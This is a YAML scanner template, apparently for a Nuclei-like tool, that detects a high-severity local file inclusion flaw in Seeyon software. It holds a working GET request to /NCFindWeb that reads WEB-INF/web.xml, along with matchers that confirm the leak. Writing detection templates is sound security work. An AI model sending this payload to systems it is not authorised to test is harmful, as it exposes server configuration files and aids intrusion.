id: "wooyun-2015-148227"
name: "Seeyon WooYun - Local File Inclusion"
severity: "high"
description: "Seeyon WooYun allows remote attackers to include the content of locally stored content and disclose it back to the attacker via local file inclusion."
tech:
  - "generic"
tags:
  - "seeyon"
  - "wooyun"
  - "lfi"
  - "zhiyuan"
  - "vuln"
reference: "https://wooyun.x10sec.org/static/bugs/wooyun-2015-0148227.html"
spaExclusion: true
request:
  method: "GET"
  path: "/NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "status"
    status:
      - 200
  - type: "word"
    part: "body"
    words:
      - "<servlet-name>NCInvokerServlet</servlet-name>"
  - type: "word"
    part: "header"
    words:
      - "application/xml"
